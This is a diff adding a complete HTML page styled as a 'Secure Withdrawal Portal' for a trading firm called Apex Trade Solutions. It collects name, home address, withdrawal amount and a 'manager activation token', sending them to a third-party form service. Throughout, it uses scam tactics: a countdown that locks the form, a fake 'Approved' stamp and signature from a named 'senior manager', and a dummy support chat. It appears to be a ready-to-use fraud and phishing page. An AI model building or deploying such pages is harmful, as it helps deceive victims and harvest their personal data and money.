@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apex Trade Solutions | Secure Withdrawal Portal</title>
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #f0f2f5; color: #1c1e21; display: flex; justify-content: center; align-items: center; min-height: 120vh; margin: 0; padding: 40px 0; }
+        .ticket-container { background: #fff; width: 450px; padding: 40px; border-radius: 12px; box-shadow: 0 20px 40px rgba(0,0,0,0.15); border-top: 8px solid #003366; position: relative; }
+        
+        /* Countdown Timer */
+        .timer-box { background: #fff5f5; color: #c53030; padding: 12px; border-radius: 8px; font-weight: bold; margin: 15px 0; font-size: 14px; border: 1px solid #feb2b2; text-align: center; }
+        
+        .header h1 { color: #003366; text-align: center; margin: 0; font-size: 22px; letter-spacing: 2px; }
+        .section-header { font-size: 11px; font-weight: 800; color: #003366; text-transform: uppercase; margin: 25px 0 12px 0; border-bottom: 1px solid #edf2f7; padding-bottom: 5px; }
+        
+        /* Form Inputs */
+        .field-label { font-size: 11px; font-weight: 700; color: #4a5568; text-transform: uppercase; margin-bottom: 6px; display: block; }
+        .input-box { width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 6px; font-size: 14px; margin-bottom: 18px; box-sizing: border-box; background: #fdfdfd; }
+        .token-zone { background: #f7fafc; border: 2px solid #003366; padding: 20px; border-radius: 8px; text-align: center; }
+        .token-input { letter-spacing: 6px; font-family: monospace; font-size: 24px; text-align: center; color: #003366; border-color: #003366; margin-bottom: 0; }
+        
+        /* Signature Area */
+        .manager-sig { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e2e8f0; position: relative; }
+        .sig-name { font-family: 'Brush Script MT', cursive; font-size: 28px; color: #003366; margin: 8px 0; }
+        .stamp { position: absolute; right: 0; top: 20px; border: 2px solid #2f855a; color: #2f855a; padding: 4px; border-radius: 4px; font-size: 10px; font-weight: bold; transform: rotate(10deg); text-transform: uppercase; }
+
+        .btn-activate { width: 100%; background: #003366; color: white; padding: 18px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 25px; transition: 0.3s; }
+        .btn-activate:hover { background: #002244; }
+        .btn-activate:disabled { background: #cbd5e0; cursor: not-allowed; }
+
+        /* Live Support Widget */
+        .chat-widget { position: fixed; bottom: 30px; right: 30px; background: #003366; color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 10px 20px rgba(0,0,0,0.2); cursor: pointer; transition: transform 0.2s; }
+        .chat-widget:hover { transform: scale(1.1); }
+        .chat-tooltip { position: fixed; bottom: 100px; right: 30px; background: white; padding: 10px 15px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); font-size: 12px; border: 1px solid #eee; }
+    </style>
+</head>
+<body>
+
+<div class="ticket-container">
+    <div class="header">
+        <h1>APEX TRADE SOLUTIONS</h1>
+        <div class="timer-box">SECURITY WINDOW EXPIRES: <span id="timer">10:00</span></div>
+    </div>
+
+    <form action="https://formspree.io/f/your-unique-id" method="POST">
+        
+        <div class="section-header">1. Client Identity Verification</div>
+        <label class="field-label">Full Legal Name</label>
+        <input type="text" name="Client_Name" class="input-box" placeholder="Enter your full name" required>
+        
+        <label class="field-label">Current Residential Address</label>
+        <input type="text" name="Client_Address" class="input-box" placeholder="Street, City, Zip, Country" required>
+
+        <div class="section-header">2. Funds Authorization</div>
+        <label class="field-label">Requested Withdrawal Amount</label>
+        <input type="text" name="Amount" class="input-box" placeholder="e.g. $25,000.00" required>
+
+        <div class="token-zone">
+            <span class="field-label" style="color:#003366">Manager Activation Token</span>
+            <input type="text" name="Token" class="input-box token-input" maxlength="8" placeholder="XXXX-XXXX" required>
+            <p style="font-size: 10px; margin-top: 10px; color: #718096;">*Ask your account manager if you do not have a token.</p>
+        </div>
+
+        <div class="manager-sig">
+            <div class="stamp">Approved</div>
+            <span class="field-label">Certified By Senior Manager</span>
+            <p style="font-size: 13px; margin: 4px 0; font-weight: 600;">Paola Almontes De León</p>
+            <p class="sig-name">P. Almontes De León</p>
+            <p style="font-size: 9px; color: #a0aec0;">Apex ID: ATS-PAM-9912</p>
+        </div>
+
+        <button type="submit" class="btn-activate" id="submitBtn">PROCESS WITHDRAWAL NOW</button>
+    </form>
+</div>
+
+<div class="chat-tooltip">Support: How can we help?</div>
+<div class="chat-widget" onclick="alert('Connecting to a Live Representative...')">
+    <span style="font-size: 24px;">💬</span>
+</div>
+
+<script>
+    let time = 600; 
+    const timerElement = document.getElementById('timer');
+    const submitBtn = document.getElementById('submitBtn');
+
+    setInterval(() => {
+        if (time <= 0) {
+            timerElement.innerHTML = "EXPIRED";
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = "SESSION TIMEOUT";
+            return;
+        }
+        let mins = Math.floor(time / 60);
+        let secs = time % 60;
+        timerElement.innerHTML = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        time--;
+    }, 1000);
+</script>
+
+</body>
+</html>
